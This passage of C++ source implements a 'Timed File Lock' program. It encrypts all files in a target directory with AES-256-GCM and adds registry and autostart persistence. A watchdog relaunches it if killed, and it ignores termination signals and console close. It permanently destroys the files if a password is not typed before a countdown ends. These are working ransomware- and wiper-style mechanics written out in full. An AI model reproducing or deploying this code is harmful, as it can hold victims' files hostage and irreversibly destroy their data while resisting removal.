        } catch (...) {}
        it.increment(ec);
    }
    return false;
}

// ==========================================
// SECTION 8: SHA-256 (unchanged — used for password verification only)
// ==========================================
bool timingSafeEqual(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    volatile int diff = 0;
    for (size_t i = 0; i < a.size(); ++i)
        diff |= (unsigned char)a[i] ^ (unsigned char)b[i];
    return diff == 0;
}

#ifdef _WIN32
std::string sha256Hex(const std::string& input) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    std::string result(64, '0');
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
        return result;
    DWORD hashObjSize = 0, dummy = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&hashObjSize, sizeof(hashObjSize), &dummy, 0);
    std::vector<uint8_t> hashObj(hashObjSize);
    if (BCryptCreateHash(hAlg, &hHash, hashObj.data(), hashObjSize, NULL, 0, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0); return result;
    }
    BCryptHashData(hHash, (PUCHAR)input.data(), (ULONG)input.size(), 0);
    uint8_t hashBytes[32] = {};
    BCryptFinishHash(hHash, hashBytes, 32, 0);
    std::ostringstream oss;
    for (int i = 0; i < 32; ++i)
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)hashBytes[i];
    result = oss.str();
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}
#else
// Pure C++ SHA-256 (unchanged from v1.3)
static const uint32_t K_SHA[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
    0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,
    0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
    0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,
    0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,
    0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};
#define RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z)  (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define S0(x) (RR(x,2)^RR(x,13)^RR(x,22))
#define S1(x) (RR(x,6)^RR(x,11)^RR(x,25))
#define G0(x) (RR(x,7)^RR(x,18)^((x)>>3))
#define G1(x) (RR(x,17)^RR(x,19)^((x)>>10))
std::string sha256Hex(const std::string& msg) {
    uint32_t h[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
                     0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
    std::vector<uint8_t> data(msg.begin(), msg.end());
    uint64_t bitLen = (uint64_t)data.size() * 8;
    data.push_back(0x80);
    while (data.size() % 64 != 56) data.push_back(0);
    for (int i = 7; i >= 0; --i) data.push_back((uint8_t)(bitLen >> (i * 8)));
    for (size_t i = 0; i < data.size(); i += 64) {
        uint32_t w[64] = {};
        for (int j = 0; j < 16; ++j)
            w[j]=((uint32_t)data[i+j*4]<<24)|((uint32_t)data[i+j*4+1]<<16)|
                 ((uint32_t)data[i+j*4+2]<<8)|(uint32_t)data[i+j*4+3];
        for (int j = 16; j < 64; ++j)
            w[j]=G1(w[j-2])+w[j-7]+G0(w[j-15])+w[j-16];
        uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
        for (int j = 0; j < 64; ++j) {
            uint32_t t1=hh+S1(e)+CH(e,f,g)+K_SHA[j]+w[j];
            uint32_t t2=S0(a)+MAJ(a,b,c);
            hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
        }
        h[0]+=a; h[1]+=b; h[2]+=c; h[3]+=d;
        h[4]+=e; h[5]+=f; h[6]+=g; h[7]+=hh;
    }
    std::ostringstream oss;
    for (int i = 0; i < 8; ++i)
        oss << std::hex << std::setw(8) << std::setfill('0') << h[i];
    return oss.str();
}
#undef RR
#undef CH
#undef MAJ
#undef S0
#undef S1
#undef G0
#undef G1
#endif

// ==========================================
// SECTION 9: Platform security hardening (unchanged)
// ==========================================
#ifdef _WIN32
static bool enableSeDebugPrivilege() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp = {};
    LUID luid = {};
    bool ok = false;
    if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    }
    CloseHandle(hToken);
    return ok;
}
static void applyProcessMitigations() {
    PROCESS_MITIGATION_DEP_POLICY dep = {};
    dep.Enable = 1; dep.Permanent = 1;
    SetProcessMitigationPolicy(ProcessDEPPolicy, &dep, sizeof(dep));
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = {};
    cfg.EnableControlFlowGuard = 1;
    SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
    PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY heap = {};
    heap.HeapTerminateOnCorruption = 1;
    SetProcessMitigationPolicy(ProcessHeapTerminateOnCorruptionPolicy, &heap, sizeof(heap));
    PROCESS_MITIGATION_IMAGE_LOAD_POLICY img = {};
    img.NoRemoteImages = 1; img.NoLowMandatoryLabelImages = 1;
    SetProcessMitigationPolicy(ProcessImageLoadPolicy, &img, sizeof(img));
    PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ext = {};
    ext.DisableExtensionPoints = 1;
    SetProcessMitigationPolicy(ProcessExtensionPointDisablePolicy, &ext, sizeof(ext));
}
static void createJobObject() {
    g_hJob = CreateJobObjectA(NULL, "TimedFileLock_Job");
    if (!g_hJob) return;
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(g_hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));
    AssignProcessToJobObject(g_hJob, GetCurrentProcess());
}
static HANDLE createParentExitEvent() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    return CreateEventA(&sa, TRUE, FALSE, NULL);
}
#endif

#ifndef _WIN32
static void hardenProcess() {
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    struct rlimit rl_core = {0, 0};
    setrlimit(RLIMIT_CORE, &rl_core);
    struct rlimit rl_nproc;
    if (getrlimit(RLIMIT_NPROC, &rl_nproc) == 0) {
        rl_nproc.rlim_cur = std::min(rl_nproc.rlim_max,
                                     (rlim_t)(std::thread::hardware_concurrency() * 4 + 16));
        setrlimit(RLIMIT_NPROC, &rl_nproc);
    }
    std::ofstream oom("/proc/self/oom_score_adj");
    if (oom) oom << "-1000\n";
}
static void installSignalHandlers() {
    struct sigaction sa = {};
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGINT,  &sa, nullptr);
    sigaction(SIGTERM, &sa, nullptr);
    sigaction(SIGHUP,  &sa, nullptr);
    sigaction(SIGQUIT, &sa, nullptr);
    sigaction(SIGPIPE, &sa, nullptr);
    sigaction(SIGUSR1, &sa, nullptr);
    sigaction(SIGUSR2, &sa, nullptr);
}
#endif

// ==========================================
// SECTION 10: Single instance & terminal (Linux)
// ==========================================
#ifndef _WIN32
bool acquireSingleInstanceLock() {
    g_lockFd = open(LOCK_FILE.c_str(), O_CREAT | O_RDWR | O_CLOEXEC, 0600);
    if (g_lockFd < 0) return false;
    if (flock(g_lockFd, LOCK_EX | LOCK_NB) != 0) {
        close(g_lockFd); g_lockFd = -1; return false;
    }
    std::string pid = std::to_string(getpid()) + "\n";
    if (ftruncate(g_lockFd, 0) != 0) {}  // best-effort
    { auto _ = write(g_lockFd, pid.c_str(), pid.size()); (void)_; }
    return true;
}
void releaseSingleInstanceLock() {
    if (g_lockFd >= 0) {
        flock(g_lockFd, LOCK_UN);
        close(g_lockFd);
        g_lockFd = -1;
        unlink(LOCK_FILE.c_str());
    }
}
static struct termios orig_termios;
static bool rawModeActive = false;
void disableRawMode() {
    if (rawModeActive) {
        tcsetattr(STDIN_FILENO, TCSAFLUSH, &orig_termios);
        rawModeActive = false;
    }
}
void enableRawMode() {
    tcgetattr(STDIN_FILENO, &orig_termios);
    atexit(disableRawMode);
    struct termios raw = orig_termios;
    raw.c_lflag &= ~(ECHO | ICANON | ISIG);
    raw.c_cc[VMIN] = 0; raw.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
    rawModeActive = true;
}
bool kbhit() {
    fd_set fds; FD_ZERO(&fds); FD_SET(STDIN_FILENO, &fds);
    struct timeval tv = {0, 0};
    return select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0;
}
int getch() {
    unsigned char c = 0;
    if (read(STDIN_FILENO, &c, 1) < 1) return -1;
    return c;
}
#endif

#ifdef _WIN32
void enableAnsiSupport() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;
    DWORD mode = 0;
    GetConsoleMode(hOut, &mode);
    SetConsoleMode(hOut, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}
BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
    switch (dwCtrlType) {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT: Sleep(INFINITE); return TRUE;
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT: Sleep(4500); return TRUE;
    }
    return FALSE;
}
#endif

// ==========================================
// SECTION 11: Watchdog
// ==========================================
#ifdef _WIN32
void spawnWatchdog() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    HANDLE hEvent = createParentExitEvent();
    std::string eventHandleStr = (hEvent != NULL) ? std::to_string((uintptr_t)hEvent) : "0";
    std::string cmdLine = std::string("\"") + exePath + "\" --watchdog "
                          + std::to_string(GetCurrentProcessId()) + " " + eventHandleStr;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(exePath, const_cast<char*>(cmdLine.c_str()),
                        NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return;
    g_watchdogPID = pi.dwProcessId;
    if (g_hJob) AssignProcessToJobObject(g_hJob, pi.hProcess);
    SetHandleInformation(pi.hProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE,
                         HANDLE_FLAG_PROTECT_FROM_CLOSE);
    g_hWatchdogProcess = pi.hProcess;
    CloseHandle(pi.hThread);
}
#else
void spawnWatchdog() {
    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len == -1) return;
    exePath[len] = '\0';
    std::string pidStr = std::to_string(getpid());
    pid_t pid = fork();
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        installSignalHandlers();
        int devnull = open("/dev/null", O_RDWR);
        if (devnull >= 0) {
            dup2(devnull, STDIN_FILENO);
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        execl(exePath, exePath, "--watchdog", pidStr.c_str(), nullptr);
        _exit(1);
    }
    g_watchdogPID = pid;
}

// [FIX] system() → execvp(): no shell, no injection risk
// Tries each known terminal emulator with a proper argv array.
void relaunchInTerminal(const char* exePath) {
    struct TermSpec {
        const char* term;
        const char* arg; // argument before exePath
    };
    static const TermSpec specs[] = {
        {"gnome-terminal", "--"},
        {"xfce4-terminal", "-e"},
        {"konsole",        "-e"},
        {"xterm",          "-e"},
        {nullptr, nullptr}
    };

    for (int i = 0; specs[i].term != nullptr; ++i) {
        pid_t pid = fork();
        if (pid == 0) {
            // Child: exec the terminal
            const char* argv_arr[] = {
                specs[i].term,
                specs[i].arg,
                exePath,
                nullptr
            };
            // Restore default SIGCHLD so terminal doesn't become zombie
            signal(SIGCHLD, SIG_DFL);
            execvp(specs[i].term, const_cast<char* const*>(argv_arr));
            _exit(127); // exec failed
        } else if (pid > 0) {
            // Parent: wait briefly to see if exec succeeded
            int status = 0;
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
            pid_t r = waitpid(pid, &status, WNOHANG);
            if (r == 0) {
                // Still running → terminal launched successfully
                return;
            }
            // Exited quickly → exec failed, try next
        }
    }
}
#endif

void killWatchdog() {
#ifdef _WIN32
    if (g_watchdogPID != 0) {
        if (g_hWatchdogProcess != NULL) {
            SetHandleInformation(g_hWatchdogProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
            TerminateProcess(g_hWatchdogProcess, 0);
            CloseHandle(g_hWatchdogProcess);
            g_hWatchdogProcess = NULL;
        } else {
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, g_watchdogPID);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
        }
        g_watchdogPID = 0;
    }
    if (g_hJob) { CloseHandle(g_hJob); g_hJob = NULL; }
#else
    if (g_watchdogPID != 0) {
        kill(g_watchdogPID, SIGKILL);
        g_watchdogPID = 0;
    }
#endif
}

// ==========================================
// SECTION 12: Persistence & settings (unchanged)
// ==========================================
void setAutostartAndTimer(long long targetEndTime) {
#ifdef _WIN32
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ,
                       (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hRunKey);
    }
    HKEY hAppKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD,
                       (const BYTE*)&targetEndTime, sizeof(targetEndTime));
        RegCloseKey(hAppKey);
    }
#else
    fs::create_directories(CONFIG_DIR);
    std::ofstream f(CONFIG_FILE);
    if (f) f << targetEndTime;
    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len != -1) {
        exePath[len] = '\0';
        fs::create_directories(fs::path(AUTOSTART_FILE).parent_path());
        std::ofstream desktop(AUTOSTART_FILE);
        if (desktop)
            desktop << "[Desktop Entry]\nType=Application\nName=TimedFileLock\n"
                    << "Exec=" << exePath << "\nHidden=false\nNoDisplay=false\n"
                    << "X-GNOME-Autostart-enabled=true\n";
    }
#endif
}

void cleanSettings() {
#ifdef _WIN32
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hRunKey, "TimedFileLockProgram");
        RegCloseKey(hRunKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, REG_APP_KEY);
#else
    std::error_code ec;
    fs::remove(CONFIG_FILE, ec);
    fs::remove(AUTOSTART_FILE, ec);
    if (fs::exists(CONFIG_DIR, ec) && fs::is_empty(CONFIG_DIR, ec))
        fs::remove(CONFIG_DIR, ec);
#endif
}

long long getSavedEndTime() {
#ifdef _WIN32
    HKEY hKey; long long endTime = 0; DWORD dataSize = sizeof(endTime);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwType = 0;
        if (RegQueryValueExA(hKey, "EndTime", NULL, &dwType,
                             (LPBYTE)&endTime, &dataSize) == ERROR_SUCCESS)
            if (dwType != REG_QWORD) endTime = 0;
        RegCloseKey(hKey);
    }
    return endTime;
#else
    std::ifstream f(CONFIG_FILE); long long endTime = 0;
    if (f) f >> endTime;
    return endTime;
#endif
}

// ==========================================
// SECTION 13: main()
// ==========================================
#ifdef _WIN32
int main() {
    enableAnsiSupport();
    enableSeDebugPrivilege();
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    if (__argc >= 3 && std::string(__argv[1]) == "--watchdog") {
        applyProcessMitigations();
        DWORD parentPID = std::stoul(__argv[2]);
        HANDLE hParent  = OpenProcess(SYNCHRONIZE, FALSE, parentPID);
        HANDLE hEvent   = (__argc >= 4) ? reinterpret_cast<HANDLE>(std::stoull(__argv[3])) : NULL;
        if (hParent) {
            HANDLE waitHandles[2] = { hParent, hEvent };
            DWORD  handleCount    = (hEvent != NULL) ? 2 : 1;
            WaitForMultipleObjects(handleCount, waitHandles, FALSE, INFINITE);
            CloseHandle(hParent);
        } else if (hEvent != NULL) {
            WaitForSingleObject(hEvent, INFINITE);
        } else { return 0; }
        HANDLE hMutex = CreateMutexA(NULL, TRUE, "TimedFileLock_Running");
        if (hMutex && GetLastError() != ERROR_ALREADY_EXISTS) {
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi = {};
            if (CreateProcessA(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                WaitForInputIdle(pi.hProcess, 2000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            ReleaseMutex(hMutex);
        }
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    // v4.0: Önce authenticate() — hardcoded hash yok
    SessionAuth sa = authenticate();
    if (!sa.success) {
        std::cerr << "[HATA] Kimlik doğrulama başarısız. Çıkılıyor.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 1;
    }
    auto& key = sa.key; // mlock'lu, secureZeroKey ile silinecek

    if (__argc == 2 && std::string(__argv[1]) == "--reset") {
        std::cout << "Resetting: decrypting files...\n";
        processFiles(TARGET_PATH, false, key);
        secureZeroKey(sa.key); // key artık gerekmez
        killWatchdog();
        cleanSettings();
        clearAuthConfig();
        std::cout << "Done. Registry and autostart entry removed.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 0;
    }

    applyProcessMitigations();
    createJobObject();
#else
int main(int argc, char* argv[]) {
    if (argc == 3 && std::string(argv[1]) == "--watchdog") {
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        installSignalHandlers();
        pid_t parentPID = static_cast<pid_t>(std::stoul(argv[2]));
        while (kill(parentPID, 0) == 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        char exePath[PATH_MAX];
        ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
        if (len != -1) {
            exePath[len] = '\0';
            int fd = open(LOCK_FILE.c_str(), O_CREAT | O_RDWR, 0600);
            if (fd >= 0) {
                if (flock(fd, LOCK_EX | LOCK_NB) == 0) {
                    flock(fd, LOCK_UN); close(fd);
                    relaunchInTerminal(exePath);
                } else { close(fd); }
            }
        }
        return 0;
    }

    // v4.0: Önce authenticate() — hardcoded hash yok
    SessionAuth sa = authenticate();
    if (!sa.success) {
        std::cerr << "[HATA] Kimlik doğrulama başarısız. Çıkılıyor.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 1;
    }
    auto& key = sa.key; // mlock'lu, secureZeroKey ile silinecek

    if (argc == 2 && std::string(argv[1]) == "--reset") {
        std::cout << "Resetting: decrypting files...\n";
        processFiles(TARGET_PATH, false, key);
        secureZeroKey(sa.key); // key artık gerekmez
        killWatchdog();
        cleanSettings();
        clearAuthConfig();
        releaseSingleInstanceLock();
        std::cout << "Done. Config and autostart entry removed.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 0;
    }

    hardenProcess();
    installSignalHandlers();
    if (!acquireSingleInstanceLock()) {
        std::cerr << "Another instance is already running.\n";
        return 1;
    }
#endif

    spawnWatchdog();
    std::cout << "--- Timed File Lock System v2.0 (AES-256-GCM) ---\n";

    long long now     = std::chrono::duration_cast<std::chrono::seconds>(
                            std::chrono::system_clock::now().time_since_epoch()).count();
    long long endTime = getSavedEndTime();

    if (endTime != 0 && !hasLockedFiles(TARGET_PATH)) {
        cleanSettings(); endTime = 0;
    }

    if (endTime == 0) {
        endTime = now + LOCK_DURATION_SECONDS;
        setAutostartAndTimer(endTime);
        processFiles(TARGET_PATH, true, key);
        std::cout << "Files locked (AES-256-GCM) and added to system startup!\n\n";
    } else {
        std::cout << "Previous locked session found, resuming...\n\n";
    }

    int remaining = static_cast<int>(endTime - now);
    if (remaining < 0) remaining = 0;

    std::string inputBuffer, statusMsg;
    bool isUnlocked = false;

#ifndef _WIN32
    enableRawMode();
#endif

    while (remaining > 0 && !isUnlocked) {
#ifdef _WIN32
        if (_kbhit()) { int ch = _getch();
#else
        if (kbhit())  { int ch = getch();
#endif
            if (ch == '\n' || ch == '\r') {
                // v4.0: Argon2id ile doğrula (timing-safe)
                std::string inputHash = argon2idHash(inputBuffer, sa.salt.data());
                if (timingSafeEqual(inputHash, sa.hashHex)) {
                    isUnlocked = true; break;
                } else {
                    statusMsg = " [!] Yanlış parola!"; inputBuffer.clear();
                }
            } else if (ch == 127 || ch == '\b') {
                if (!inputBuffer.empty()) inputBuffer.pop_back();
            } else if (ch >= 32 && ch <= 126 && inputBuffer.size() < MAX_PASSWORD_LEN) {
                inputBuffer += static_cast<char>(ch); statusMsg = "";
            }
        }

        now = std::chrono::duration_cast<std::chrono::seconds>(
                  std::chrono::system_clock::now().time_since_epoch()).count();
        remaining = static_cast<int>(endTime - now);
        if (remaining < 0) remaining = 0;

        int mins = remaining / 60, secs = remaining % 60;
        std::cout << "\r\033[K" << "Time left: "
                  << std::setfill('0') << std::setw(2) << mins << ":"
                  << std::setfill('0') << std::setw(2) << secs
                  << " | Password: " << std::string(inputBuffer.size(), '*')
                  << statusMsg << std::flush;

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

#ifndef _WIN32
    disableRawMode();
#endif

    if (isUnlocked) {
        std::cout << "\n\nUNLOCKING...\n";
        processFiles(TARGET_PATH, false, key);
        secureZeroKey(sa.key);     // v4.0: key bellekten güvenli sil
        killWatchdog();
        cleanSettings();
        clearAuthConfig();         // v4.0: auth config temizle
#ifndef _WIN32
        releaseSingleInstanceLock();
#endif
        std::cout << "Tüm dosyalar çözüldü, sistem temizlendi.\n";
    } else {
        std::cout << "\n\nSÜRE DOLDU! KILITLI DOSYALAR İMHA EDİLİYOR...\n";
        secureZeroKey(sa.key);     // v4.0: timer dolunca key'i ÖNCE sil
                                   // → Dosyalar şifreli kalır, matematiksel erişilemez
                                   // → secureDelete() ek güvence olarak çalışır
        destroyLockedFiles(TARGET_PATH);
        killWatchdog();
        cleanSettings();
        clearAuthConfig();         // v4.0: auth config temizle
#ifndef _WIN32
        releaseSingleInstanceLock();
#endif
        std::cout << "Tüm kilitli dosyalar kalıcı olarak imha edildi.\n";
    }

    std::this_thread::sleep_for(std::chrono::seconds(3));
    return 0;
}
